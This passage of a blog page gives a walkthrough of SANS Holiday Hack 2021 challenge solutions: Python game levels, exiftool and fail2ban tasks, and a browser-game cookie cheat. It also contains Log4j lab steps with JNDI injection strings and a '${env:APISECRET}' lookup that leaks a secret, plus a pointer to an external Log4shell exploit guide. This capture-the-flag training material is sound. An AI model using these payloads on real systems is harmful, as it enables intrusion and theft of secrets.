+-&gt; curl –interface eth0 http://[fe80::42::c0ff:fea8:a002]:9000/
+“PieceOnEarth”
+Place this string in the top terminal as solution</p>
+
+<h2 id="elf-code-python">
+<a class="anchor" href="#elf-code-python" aria-hidden="true"><span class="octicon octicon-link"></span></a>Elf code Python</h2>
+
+<h3 id="level-1-3">
+<a class="anchor" href="#level-1-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 1</h3>
+
+<p>Just run the code</p>
+
+<h3 id="level-2-3">
+<a class="anchor" href="#level-2-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 2</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import elf, munchkins, levers, lollipops, yeeters, pits
+elf.moveLeft(10)
+elf.moveUp(2)
+elf.moveRight(3)
+elf.moveUp(6)
+elf.moveLeft(3)
+elf.moveUp(2)
+</code></pre></div></div>
+
+<h3 id="level-3-3">
+<a class="anchor" href="#level-3-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 3</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import elf, munchkins, levers, lollipops, yeeters, pits
+lever0 = levers.get(0)
+modified_data=lever0.data()+2
+elf.moveLeft(6)
+lever0.pull(modified_data)
+elf.moveLeft(4)
+elf.moveUp(10)
+</code></pre></div></div>
+
+<h3 id="level-4-3">
+<a class="anchor" href="#level-4-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 4</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import elf, munchkins, levers, lollipops, yeeters, pits
+# Complete the code below:
+lever0, lever1, lever2, lever3, lever4 = levers.get()
+# Move onto lever4
+elf.moveLeft(2)
+# This lever wants a str object:
+lever4.pull("A String")
+# Need more code below:
+elf.moveUp(2)
+lever3.pull(True)
+elf.moveUp(2)
+lever2.pull(1)
+elf.moveUp(2)
+lever1.pull([])
+elf.moveUp(2)
+lever0.pull({})
+elf.moveUp(2)
+</code></pre></div></div>
+
+<h3 id="level-5-3">
+<a class="anchor" href="#level-5-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 5</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import elf, munchkins, levers, lollipops, yeeters, pits
+# Fix/Complete Code below
+lever0, lever1, lever2, lever3, lever4 = levers.get()
+# Solve for each lever, moving to the space
+# on the lever before calling leverN.pull()
+elf.moveLeft(2)
+lever4.pull(lever4.data()+" concatenate")
+elf.moveUp(2)
+lever3.pull(not lever3.data())
+elf.moveUp(2)
+lever2.pull(lever2.data()+1)
+elf.moveUp(2)
+l=lever1.data()
+l.append(1)
+lever1.pull(l)
+elf.moveUp(2)
+d=lever0.data()
+d.update({"strkey":"strvalue"})
+lever0.pull(d)
+elf.moveUp(2)
+</code></pre></div></div>
+
+<h3 id="level-6-3">
+<a class="anchor" href="#level-6-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 6</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import elf, munchkins, levers, lollipops, yeeters, pits
+# Fix/Complete the below code
+lever = levers.get(0)
+data = lever.data()
+if type(data) == bool:
+data = not data
+elif type(data) == int:
+data = data * 2
+elif type(data) == str:
+data = data + data
+elif type(data) == dict:
+data["a"] = data["a"]+1
+elf.moveUp(2)
+lever.pull(data)
+elf.moveUp(2)
+</code></pre></div></div>
+
+<h3 id="level-7-2">
+<a class="anchor" href="#level-7-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 7</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import elf, munchkins, levers, lollipops, yeeters, pits
+for num in range(5): #not sure if number is right
+elf.moveLeft(3)
+if num % 2 == 0:
+elf.moveUp(12)
+else:
+elf.moveDown(12)
+</code></pre></div></div>
+
+<h3 id="level-8-2">
+<a class="anchor" href="#level-8-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 8</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import elf, munchkins, levers, lollipops, yeeters, pits
+all_lollipops = lollipops.get()
+for lollipop in all_lollipops:
+elf.moveTo(lollipop.position)
+lever0=levers.get(0)
+elf.moveTo(lever0.position)
+d = lever0.data()
+d.insert(0,"munchkins rule")
+lever0.pull(d)
+elf.moveDown(5)
+elf.moveTo({"x":2,"y":2})
+</code></pre></div></div>
+
+<h3 id="level-9-1">
+<a class="anchor" href="#level-9-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 9</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import elf, munchkins, levers, lollipops, yeeters, pits
+
+def func_to_pass_to_mucnhkin(list_of_lists):
+sum_of_ints_in_list_of_lists = 0
+for member_list in list_of_lists:
+for member in member_list:
+if type(member) == int:
+sum_of_ints_in_list_of_lists = sum_of_ints_in_list_of_lists + member
+return sum_of_ints_in_list_of_lists
+
+all_levers = levers.get()
+# Create Movement pattern:
+moves = [elf.moveDown, elf.moveLeft, elf.moveUp, elf.moveRight] * 2
+
+# We iterate over each move in moves getting an index (i) number that increments by one each time
+for i, move in enumerate(moves):
+move(i+1)
+# We need to call each move
+# if i is less than the len(all_levers), we pull the lever
+if i &lt; len(all_levers):
+all_levers[i].pull(i)
+
+elf.moveUp(2)
+elf.moveLeft(4)
+munchkin = munchkins.get(0)
+munchkin.answer(func_to_pass_to_mucnhkin)
+elf.moveUp(1)
+</code></pre></div></div>
+
+<h3 id="level-10-1">
+<a class="anchor" href="#level-10-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 10</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import elf, munchkins, levers, lollipops, yeeters, pits
+import time
+muns = munchkins.get()
+lols = lollipops.get()[::-1]
+for index, mun in enumerate(muns):
+# need to wait while absolute distance between
+# elf.position["x"] and mun.position['x'] is less than 6
+# then we move to next lollipop
+# We can use time.sleep(0.05) to add a small delay in a while loop
+while abs(elf.position["x"]-mun.position["x"]) &lt; 6:
+time.sleep(0.05)
+elf.moveTo(lols[index].position)
+elf.moveTo({"x":2,"y":2})
+</code></pre></div></div>
+
+<h2 id="document-analysis-exiftool-metadata">
+<a class="anchor" href="#document-analysis-exiftool-metadata" aria-hidden="true"><span class="octicon octicon-link"></span></a>Document Analysis Exiftool Metadata</h2>
+
+<p>exiftool * | grep “Jack Frost” -C 45 | grep “^File Name” 
+=&gt; 2021-12-21.docx</p>
+
+<h2 id="frostavator">
+<a class="anchor" href="#frostavator" aria-hidden="true"><span class="octicon octicon-link"></span></a>Frostavator</h2>
+
+<p>xor nor xnor
+and nand or</p>
+
+<h2 id="hoho-no-fail2ban">
+<a class="anchor" href="#hoho-no-fail2ban" aria-hidden="true"><span class="octicon octicon-link"></span></a>Hoho No Fail2ban</h2>
+
+<p>Look into
+<code class="language-plaintext highlighter-rouge">cat /var/log/hohono.log</code> to get an overview</p>
+
+<p>PoC to find the regex which shouldnt be allowed:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cat /var/log/hohono.log  | grep -v successful | grep -v Valid | grep -v 'Invalid heartbeat' | grep -v   'rejected due to unknown user' | grep -v 'sent a malformed request' | grep -v 'Failed login'
+ root@3ee23184d155:~#
+</code></pre></div></div>
+
+<p>vim /etc/fail2ban/filter.d/naughtylistservice.conf
+=&gt;</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/fail2ban/filter.d/naughtylistservice.conf
+[Definition]
+failregex = Invalid heartbeat '.*' from &lt;HOST&gt;
+Login from &lt;HOST&gt; rejected due to unknown user name
+&lt;HOST&gt; sent a malformed request
+Failed login from &lt;HOST&gt; for .*
+</code></pre></div></div>
+<p>vim /etc/fail2ban/action.d/naughtylistservice.conf
+=&gt;</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/fail2ban/action.d/naughtylistservice.conf
+[Definition]
+actionban = /root/naughtylist add &lt;ip&gt;
+</code></pre></div></div>
+
+<p>vim /etc/fail2ban/jail.d/naughtylistservice.conf
+=&gt;</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/fail2ban/jail.d/naughtylistservice.conf
+# service name
+[naughtylistservice]
+# tune on / off
+enabled = true
+# filter for naughtylist service
+filter = naughtylistservice
+# file to parse
+logpath = /var/log/hohono.log
+# ban rule
+# 10 times+ on 1 hour
+maxretry = 10
+findtime = 3600
+action = naughtylistservice
+</code></pre></div></div>
+
+<p>service fail2ban restart
+fail2ban-client status
+fail2ban-client status naughtylistservice
+/root/naughtylist refresh</p>
+
+<h2 id="santas-holiday-hero">
+<a class="anchor" href="#santas-holiday-hero" aria-hidden="true"><span class="octicon octicon-link"></span></a>Santas Holiday Hero</h2>
+
+<p>Set cookie “HOHOHO” to “%7B%22single_player%22%%3Atrue%7D”
+Set a breakpoint at holidayhero.min.js:736
+Goto console and set single_player_mode=true
+=&gt; Play together with SYSTEM and win</p>
+
+<h2 id="bonus-blue-log4jack">
+<a class="anchor" href="#bonus-blue-log4jack" aria-hidden="true"><span class="octicon octicon-link"></span></a>Bonus Blue Log4jack</h2>
+
+<p>-&gt; Y
+-&gt; ls
+-&gt; next
+-&gt; cd vulnerable
+-&gt; cat DisplayFilev1.java
+-&gt; javac DisplayFilev1.java
+-&gt; java DisplayFilev1 testfile.txt
+-&gt; java DisplayFilev1 testfile2.txt
+-&gt; next
+-&gt; cat DisplayFilev2.java
+-&gt; next
+-&gt; javac DisplayFilev2.java
+-&gt; java DisplayFilev2 testfile.txt
+-&gt; java DisplayFilev2 testfile2.txt
+-&gt; next
+-&gt; java DisplayFilev2 ‘${java:version}’
+-&gt; java DisplayFilev2 ‘${env:APISECRET}’
+-&gt; next
+-&gt; ./startserver.sh
+-&gt; java DisplayFilev2 ‘${jndi:ldap://127.0.0.1:1389/Exploit}’
+-&gt; cd ../patched
+-&gt; ls
+-&gt; source classpath.sh
+-&gt; javac DisplayFilev2.java
+-&gt; java DisplayFilev2 ‘${java:version}’
+-&gt; cd ..
+-&gt; log4j-scan vulnerable/
+-&gt; log4j-scan patched/
+-&gt; log4j-scan /var/www/solr
+-&gt; next
+-&gt; cd /var/log/www
+-&gt; ls
+-&gt; cd
+-&gt; cat logshell-search.sh
+-&gt; ./logshell-search.sh /var/log/www
+-&gt; ./logshell-search.sh /var/log/www | sed “1!d”
+-&gt; ./logshell-search.sh /var/log/www | sed “2!d”
+-&gt; ./logshell-search.sh /var/log/www | sed “3!d”
+-&gt; next</p>
+
+<h2 id="bonus-blue-log4jack-1">
+<a class="anchor" href="#bonus-blue-log4jack-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Bonus Blue Log4jack</h2>
+
+<p>Follow all the steps in https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4 
+and replace WEBSERVERIP, NETCATIP and MARSHALSECIP with your ip (<code class="language-plaintext highlighter-rouge">ip a</code>)
+Answer text from <code class="language-plaintext highlighter-rouge">/home/solr/kringle.txt</code> is
+“””
+The solution to Log4shell is patching
+Sincerely,</p>
+
+<p>Santa
+“””</p>
+
+<p>So<br>
+“patching” is what you search.</p>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="https://secf00tprint.github.io/feed.xml">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                  </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="https://github.com/secf00tprint" target="_blank" rel="noopener noreferrer">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="https://www.xing.com/profile/Matthias_Altmann9" target="_blank" rel="noopener noreferrer">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-xing fa-stack-1x fa-inverse"></i>
+                  </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">©2020 <a href="/blog/legal/legalstuff.html">Legal Stuff</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+</body>
+
+</html>
